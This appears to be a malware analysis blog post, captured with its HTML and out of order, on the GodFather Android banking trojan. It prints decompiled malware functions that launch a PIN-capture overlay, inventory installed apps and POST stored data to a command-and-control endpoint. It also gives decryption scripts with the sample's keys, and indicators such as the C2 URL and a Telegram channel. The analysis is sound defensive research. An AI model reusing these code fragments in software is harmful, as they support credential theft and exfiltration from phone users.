TimerTask() {                @Override                public void run() {                    if (Tamarix.bedamned(ctx, &quot;opi&quot;).contains(&quot;false&quot;)) {                        String bedamned = Tamarix.bedamned(ctx, &quot;opo&quot;);                        String effluvias = &quot;true&quot;;                        if (bedamned.contains(effluvias)) {                            Besant.mismoving.cancel();                            timerObj.cancel();                            Tamarix.Sandrakottos(ctx, &quot;oph&quot;, effluvias);                            return;                        }                        Intent dialogIntent = new Intent(ctx, untraffickable.class)                            .putExtra(&quot;str&quot;, &quot;ALL_PIN&quot;)                            .putExtra(&quot;id&quot;, &quot;1500&quot;);                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);                        ctx.startActivity(dialogIntent);                    }                }            };            mismoving = timerTask;            timerObj.schedule(timerTask, 0L, 2000L);        } catch (Exception e) {        }    }}OsnabruckIn this function a “bowfin” string is initialized with the value, representing an empty string or URL escape character.A loop is run through the list of installed applications obtained through the PackageManager.For each PackageInfo in the list:  If the Flag_System flag of the application is disable (indicating that the application is non-system),  the application package name is added to the bowfin string, followed by |||.At the end, the bowfin string is passed to the Sandrakottos function.   public static String Osnabruck(Context context) {        bowfin = HttpUrl.FRAGMENT_ENCODE_SET;        try {            List&lt;PackageInfo&gt; b = context.getPackageManager().getInstalledPackages(0);            for (int i = 0; i &lt; b.size(); i++) {                PackageInfo p = b.get(i);                ApplicationInfo applicationInfo = p.applicationInfo;                if ((applicationInfo.flags &amp; 1) == 0) {                    String a = applicationInfo.packageName;                    bowfin += a + (&quot;|||&quot;);                }            }            Tamarix.Sandrakottos(context, (&quot;alt&quot;), bowfin);        } catch (Exception e) {        }        return bowfin;    }Tamarix.Sandrakottos(context, (“alt”), bowfin);In the shared preference we can see:That is because we use a New Emulator with no application installed.MalacostracaThis function retrieves the value associated with the key “ky” from the SharedPreference.It Inserts an addition parameter with key “ick” and value “true” into the params map,retrieves the value associated with key “min” from the shared preferences using the bedamned method.After that it passes the retrived value to the Uriiah function to obtain the base URL.Adds “call.php” to the obtained base url.Call undissuadably method to perform an HTTP POST request to this URL with the params.public static void Malacostraca(Context context) {    String effluvias = &quot;ky&quot;;    try {        HashMap&lt;String, String&gt; params = new HashMap&lt;&gt;();                params.put(effluvias, bedamned(context, effluvias));                params.put(&quot;ick&quot;, &quot;true&quot;);                String url = Uriiah(bedamned(context, &quot;min&quot;)) + &quot;callnew.php&quot;;                veepees.undissuadably(context, url, params);    } catch (Exception e) {    }}ConclusionAnalysis of some of GodFather’s features provided insight into its capabilities and operation.Here are the key points that emerged from our analysis:•   C2 communication: GodFather uses encrypted communication with the command-and-control server to send stolen data and receive commands. This two-way channel allows attackers to manage the infection in real time, updating the malware with new instructions or exfiltrating additional data without raising suspicion. •   Using Shared Preferences: The malware exploits Android’s Shared Preferences to store critical information, such as login details or temporary keys. This technique allows GodFather to retain data even after a device reboot, maintaining persistence and making it easier to retrieve the information for later use.Indicator of Compromise            App Name      Chrome.apk              Package Name      com.melting.mantaught              Sha256      20116083565a50f6b2db59011e9994e9a9f5db5994703d53233b8b202a5ad2f3              Telegram Channel      https://t.me/famokorapisoram              C2 Server      https://yukoramparata.top/zamra/aaa/      List of quick reference of function            Function Name      Description                  cirrofilum.effluvias      Decipher Strings              Sandrakottos      Write data inside the SharedPreference              bedamned      Retrive data from SharedPreference              champaka      Generate random string              undissuadably      Use OkHttp to mke a request and then process the http response and save it in the sharepreference              hagiography      Decode a string into Base64              Uriiah      Deciphering with blowfish, SecretKeySpec “ABC”              samariums      Takes a string in b64 and decoding it with an algorithm              hexammine      Send data to a remote server              rarefeatured      Prepares to send a request http              gnarliness      Takes a string in input, converts it to a byte array using UTF-8 encoding and then econdes the byte array in Base64, return the string as result              trochanteric      Converts an array of bytes into a hexadecimal string              crakow      Ensure that the lenght of string “s” is a multiple of 16 by adding null characters to the end of the string if necessary              Predicator      Function where an IV (sulphuric) is initialized using a fixed sequence of hexadecimal characters (“fedcba9876543210”). A secret key (potlatching) is created for the AES algorighm using a fix sequence of hexadecimal characters (“0123456789abcdef”).              Spellican      Executes an Http Get request to a specified URL, parses the HTML response to find a specific metatag and then stores the contents of that tag in the Android SharedPreferences              Malacostraca      Function that exectues ab Http Post request with certain parameters and URL, using methods to support for Recover values and build demand              Abourezk      Function that checks whether the app has permission to ignore battery optimization and, if it does not, request that permission. Once permission is obtained, it opens a specific URL in the chrome browser              JJ      Function that determines a code based on the manufacturer and model of the Android device it is running on, and then uses the Sandrakottos method of the Tamarix class to send this code along with the “device” key              speculated      Function that checks whether the device is locked. If it is not, it initiates a periodic action that checks a specific condition in the shared preferences and, if satisfied, cancels the timer and logs the event.              untraffickable      Function that primarily handles the display of a Web page in a WebView, with specific configurations based on values obtained from methods in other classes (Tamarix and cirrofilum).              Osnabruck      Function that returns a string containing the package names of the non-system applications installed on the Android device and writes this info to the sharedpreferences              supersincerity      The function configures various parameters in the context of the application based on default values and the default language of the device.              Champaka      Creates a random string used for “ky” of sharedpreferences      Shared Preference UnmaskThe following is a version of app.xml with an explanation of the main fields and the functions that go into interacting with them.https://github.com/phemt91/GodFather_String/blob/main/Shared%20Preference%20Details">
    <meta itemprop="datePublished" content="2024-12-10T00:00:00+00:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">
            <a href="https://ph3mt.github.io//blog/2024/12/10/godfather-android-analysis.html" itemprop="url">GodFather Android Malware Analysis
</a>
          </h1>
          

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          18 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content" itemprop="text">
        
        <p>GodFather is an Android malware that was first identified in mid 2023 and quickly attracted the attention of security experts because of its advanced capabilities and modular structure.
Its design highlights a significant evolution from its predecessors, exploiting sophisticated techniques to circumvent security measures and infect Android devices.</p>

<p>In this article, we will explore how this version of the malware communicates with the C2 server, a critical component that allows attackers to manage the malware in real time and receive stolen data. We will also analyze GodFather’s use of Shared Preferences to store important data locally on the infected device, making it more difficult to detect and delete the collected information.</p>

<h2 id="apk-overview">APK Overview</h2>

<p>Looking for the SHA-256 of the apk on <a href="https://www.virustotal.com/gui/file/20116083565a50f6b2db59011e9994e9a9f5db5994703d53233b8b202a5ad2f3">VirusTotal</a>, we immediately notice that it is already reported as malicious by several security vendors.</p>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img1.png" alt="Figure 1 - VirusTotal" /></p>

<p>The application bundle contains several files, the <strong>app.xml</strong> file contained in the shared_prefs looks interesting (it will be explained later).</p>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img2.png" alt="Figure 2 - Bundle details" /></p>

<p>The domain (which will be explained later in the article) also turns out to be malicious.</p>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img3.png" alt="Figure 3 - VirusTotal2" /></p>

<h2 id="new-version-of-godfather">New Version of GodFather</h2>

<p>The first thing one notices upon examining the apk is the absence of an anti-emulator check unlike the samples analyzed by <a href="https://muha2xmad.github.io/malware-analysis/godfather">muha2xmad</a> and <a href="https://www.group-ib.com/blog/godfather-trojan/">group-ib</a>.</p>

<h3 id="step1--encrypted-strings">Step1 : Encrypted strings</h3>

<p>The strings in the application appear to be encrypted, in fact in the following image you can see some of the encrypted strings used by the malware.</p>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img4.png" alt="Figure 4 - BuildConfig" /></p>

<p>The class that deals with decrypt these strings is <strong>effluvias</strong>.</p>

<p>![Figure 5 - Effluvias Class](/assets/images/2024-12-09-godfather-android-analysis/img5.png</p>

<p>This function decrypts a base64 text using the AES algorithm in CBC mode with PKCS5 padding.</p>

<p>Using JAVA, it is possible to reproduce the reverse mechanism to decipher the strings in the apk. Below is the code used to decipher the strings.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Arrays</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.crypto.Cipher</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.crypto.spec.IvParameterSpec</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.crypto.spec.SecretKeySpec</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.charset.StandardCharsets</span><span class="o">;</span>
 
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DecryptionExample</span> <span class="o">{</span>
    
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// Check args</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">args</span><span class="o">.</span><span class="na">length</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Inserisci il testo cifrato."</span><span class="o">);</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">exit</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
        <span class="o">}</span>
 
        <span class="nc">String</span> <span class="n">encryptedText</span> <span class="o">=</span> <span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
 
        <span class="nc">String</span> <span class="n">decryptedText</span> <span class="o">=</span> <span class="n">effluvias</span><span class="o">(</span><span class="n">encryptedText</span><span class="o">);</span>
        
        <span class="k">if</span> <span class="o">(</span><span class="n">decryptedText</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Decrypted text: "</span> <span class="o">+</span> <span class="n">decryptedText</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Failed to decrypt text"</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
 
    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">effluvias</span><span class="o">(</span><span class="nc">String</span> <span class="n">ciphertext</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">cipherbytes</span> <span class="o">=</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">ciphertext</span><span class="o">);</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">initVector</span> <span class="o">=</span> <span class="nc">Arrays</span><span class="o">.</span><span class="na">copyOfRange</span><span class="o">(</span><span class="n">cipherbytes</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">16</span><span class="o">);</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">messagebytes</span> <span class="o">=</span> <span class="nc">Arrays</span><span class="o">.</span><span class="na">copyOfRange</span><span class="o">(</span><span class="n">cipherbytes</span><span class="o">,</span> <span class="mi">16</span><span class="o">,</span> <span class="n">cipherbytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
            <span class="nc">IvParameterSpec</span> <span class="n">iv</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">IvParameterSpec</span><span class="o">(</span><span class="n">initVector</span><span class="o">);</span>
            <span class="nc">SecretKeySpec</span> <span class="n">skeySpec</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SecretKeySpec</span><span class="o">(</span><span class="s">"B9M80O2RAK1VRJNV"</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="nc">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">),</span> <span class="s">"AES"</span><span class="o">);</span>
            <span class="nc">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="nc">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"AES/CBC/PKCS5PADDING"</span><span class="o">);</span>
            <span class="n">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="nc">Cipher</span><span class="o">.</span><span class="na">DECRYPT_MODE</span><span class="o">,</span> <span class="n">skeySpec</span><span class="o">,</span> <span class="n">iv</span><span class="o">);</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">byte_array</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">messagebytes</span><span class="o">);</span>
            <span class="k">return</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">byte_array</span><span class="o">,</span> <span class="nc">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">ex</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>With the script it was possible create a full list of Encrypted and Decrypted String, https://github.com/phemt91/GodFather_String.git</p>

<h3 id="step2--c2-communication">Step2 : C2 Communication</h3>

<p>Having installed the apk in the emulator, it was possible to start observing its behavior. Regarding network calls, we can see an attempt to connect to the first  in the image below:</p>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img6.png" alt="Figure 6 - Http Request" /></p>

<p>Examining the code we find references to it:</p>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img7.png" alt="Figure 7 - VirusTotal" /></p>

<p>Using the script to decipher the strings in fact we find that:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>o7lGWUU/28+5RpweyMuUGihsbHNkfHAHwgyycKpQfBmF6MkVSa58Dvr6WU6eFxLJ:https://t[.]me/famokorapisoram
</code></pre></div></div>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img8.png" alt="Figure 8 - Decrypted String" /></p>

<p>The string also appears to be encrypted, plus we find that this particular string is also present in the Shared Preference:</p>

<pre><code class="language-XML">&lt;string name="min"&gt;zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==&lt;/string&gt;
</code></pre>

<p>Continuing the analysis we find that:</p>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img9.png" alt="Figure 9 - Shared Preferences Data" /></p>

<p>Contextualizing them:</p>

<h4 id="hagiography">Hagiography</h4>

<p>The function takes a Base64-encoded string, decodes it into a byte array, assigns the decoded byte array to a global variable called cremosin, and returns the decoded string.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">hagiography</span><span class="o">(</span><span class="nc">String</span> <span class="n">c</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">cremosin</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">decode</span> <span class="o">=</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="nc">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">),</span> <span class="mi">0</span><span class="o">);</span>
        <span class="n">cremosin</span> <span class="o">=</span> <span class="n">decode</span><span class="o">;</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">decode</span><span class="o">);</span>
    <span class="o">}</span>
</code></pre></div></div>

<h4 id="uriiah">Uriiah</h4>

<p>The function is designed to encrypt a string s using a symmetric encryption algorithm (presumably Blowfish) with a secret key set “ABC”</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">Uriiah</span><span class="o">(</span><span class="nc">String</span> <span class="n">s</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">String</span> <span class="n">effluvias</span> <span class="o">=</span> <span class="o">(</span><span class="s">"Blowfish"</span><span class="o">);</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="k">return</span> <span class="nf">samariums</span><span class="o">(</span><span class="n">s</span><span class="o">,</span> <span class="k">new</span> <span class="nc">SecretKeySpec</span><span class="o">((</span><span class="s">"ABC"</span><span class="o">).</span><span class="na">getBytes</span><span class="o">(),</span> <span class="n">effluvias</span><span class="o">),</span> <span class="nc">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="n">effluvias</span><span class="o">));</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="nc">HttpUrl</span><span class="o">.</span><span class="na">FRAGMENT_ENCODE_SET</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<h4 id="samariums">Samariums</h4>
<p>This function takes a Base64-encoded string, decrypt it using a symmetric encryption algorithm with a secret key and a specific IV, returning the decrypted string.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">samariums</span><span class="o">(</span><span class="nc">String</span> <span class="n">s</span><span class="o">,</span> <span class="nc">SecretKeySpec</span> <span class="n">sec</span><span class="o">,</span> <span class="nc">Cipher</span> <span class="n">c</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">InvalidAlgorithmParameterException</span><span class="o">,</span> <span class="nc">InvalidKeyException</span><span class="o">,</span> <span class="nc">IllegalBlockSizeException</span><span class="o">,</span> <span class="nc">BadPaddingException</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">val</span> <span class="o">=</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">s</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
            <span class="n">c</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">sec</span><span class="o">,</span> <span class="k">new</span> <span class="nc">IvParameterSpec</span><span class="o">((</span><span class="s">"abcdefgh"</span><span class="o">).</span><span class="na">getBytes</span><span class="o">()));</span>
            <span class="k">return</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">val</span><span class="o">));</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="nc">HttpUrl</span><span class="o">.</span><span class="na">FRAGMENT_ENCODE_SET</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>Starting with this information, it was possible to create a script that would allow us to decipher the string:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">javax.crypto.Cipher</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.crypto.spec.IvParameterSpec</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.crypto.spec.SecretKeySpec</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.charset.StandardCharsets</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
 
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DecryptionScript</span> <span class="o">{</span>
 
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">String</span> <span class="n">encryptedString</span> <span class="o">=</span> <span class="s">"zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ=="</span><span class="o">;</span>
        <span class="nc">String</span> <span class="n">decryptedString</span> <span class="o">=</span> <span class="n">decrypt</span><span class="o">(</span><span class="n">encryptedString</span><span class="o">);</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Decrypted String: "</span> <span class="o">+</span> <span class="n">decryptedString</span><span class="o">);</span>
    <span class="o">}</span>
 
    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">decrypt</span><span class="o">(</span><span class="nc">String</span> <span class="n">encryptedString</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">String</span> <span class="n">decrypted</span> <span class="o">=</span> <span class="nc">Uriiah</span><span class="o">(</span><span class="n">encryptedString</span><span class="o">);</span>
            <span class="k">return</span> <span class="n">decrypted</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
 
    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">Uriiah</span><span class="o">(</span><span class="nc">String</span> <span class="n">s</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">String</span> <span class="n">effluvias</span> <span class="o">=</span> <span class="nc">AnnotationHttp</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"Blowfish"</span><span class="o">);</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="k">return</span> <span class="nf">samariums</span><span class="o">(</span><span class="n">s</span><span class="o">,</span> <span class="k">new</span> <span class="nc">SecretKeySpec</span><span class="o">(</span><span class="nc">AnnotationHttp</span><span class="o">.</span><span class="na">effluvias</span><span class="o">(</span><span class="s">"ABC"</span><span class="o">).</span><span class="na">getBytes</span><span class="o">(),</span> <span class="n">effluvias</span><span class="o">),</span> <span class="nc">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="n">effluvias</span><span class="o">));</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
 
<span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">samariums</span><span class="o">(</span><span class="nc">String</span> <span class="n">s</span><span class="o">,</span> <span class="nc">SecretKeySpec</span> <span class="n">sec</span><span class="o">,</span> <span class="nc">Cipher</span> <span class="n">c</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
    <span class="kt">byte</span><span class="o">[]</span> <span class="n">val</span> <span class="o">=</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>
    <span class="n">c</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="nc">Cipher</span><span class="o">.</span><span class="na">DECRYPT_MODE</span><span class="o">,</span> <span class="n">sec</span><span class="o">);</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">val</span><span class="o">),</span> <span class="nc">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">);</span>
<span class="o">}</span>
 
    <span class="c1">// Dummy class for AnnotationHttp</span>
    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">AnnotationHttp</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">effluvias</span><span class="o">(</span><span class="nc">String</span> <span class="n">s</span><span class="o">)</span> <span class="o">{</span>
            <span class="c1">// Dummy implementation</span>
            <span class="k">return</span> <span class="n">s</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>It returns the following url:</p>

<p>https://yukoramparata[.]top/zamra/aaa/</p>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img10.png" alt="Figure 10 - Http Request" /></p>

<p>Analyzing the endpoint on VirusTotal it was found to be malicious:</p>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img11.png" alt="Figure 11 - C2 Server Communication" /></p>

<h3 id="step3--shared-preference-and-talking-with-c2">Step3 : Shared Preference and Talking with C2</h3>

<p>When the application starts, a file called app.xml is created inside the shared preferences, containing several pieces of information:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

<span class="o">&lt;?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="err">'</span><span class="mf">1.0</span><span class="err">'</span> <span class="n">encoding</span><span class="o">=</span><span class="err">'</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span><span class="err">'</span> <span class="n">standalone</span><span class="o">=</span><span class="err">'</span><span class="n">yes</span><span class="err">'</span> <span class="o">?&gt;</span> 

<span class="o">&lt;</span><span class="n">map</span><span class="o">&gt;</span> 

    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"acb"</span><span class="o">&gt;</span><span class="kc">false</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"aox"</span><span class="o">&gt;</span><span class="nc">UGxheSBTdG9yZQ</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"sy2"</span><span class="o">&gt;</span><span class="kc">false</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"notification"</span><span class="o">&gt;</span><span class="nc">UGxlYXNlIGdyYW50IGFjY2Vzc2liaWxpdHkgcGVybWlzc2lvbiB0byB1c2UgdGhlIGFwcGxpY2F0aW9uLg</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"btck"</span><span class="o">&gt;</span><span class="kc">false</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"onb2"</span><span class="o">&gt;</span><span class="kc">false</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"tag"</span><span class="o">&gt;</span><span class="nc">MDQwMUVO</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"giflink"</span><span class="o">&gt;</span><span class="n">aHR0cHM6Ly9zNS5naWZ5dS5jb20vaW1hZ2VzL1M4QWg2LmdpZg</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"opc"</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"messagex"</span><span class="o">&gt;</span><span class="nc">QSBuZXcgdmVyc2lvbiBvZiBvdXIgYXBwbGljYXRpb24gaXMgYXZhaWxhYmxlLiBUbyB1cGRhdGUsIGdvIHRvIFBsYXkgU3RvcmUu</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"oph"</span><span class="o">&gt;</span><span class="kc">false</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"cdm2"</span><span class="o">&gt;</span><span class="n">reee</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"alt"</span><span class="o">&gt;</span><span class="n">com</span><span class="o">.</span><span class="na">melting</span><span class="o">.</span><span class="na">mantaught</span><span class="o">|||&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"opi"</span><span class="o">&gt;</span><span class="kc">false</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
